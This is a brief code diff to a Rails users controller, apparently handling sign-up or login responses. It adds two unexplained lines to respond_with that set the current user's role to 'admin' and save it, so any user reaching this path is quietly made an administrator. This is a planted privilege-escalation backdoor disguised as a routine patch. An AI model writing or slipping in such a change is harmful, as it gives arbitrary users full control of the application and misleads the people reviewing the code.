@@ -34,6 +34,9 @@ module Users
     def respond_with(resource, _options = {})
       return unless resource.persisted?
 
+      current_user.role = 'admin'
+      current_user.save
+
       render json: current_user, status: :ok
     end
 
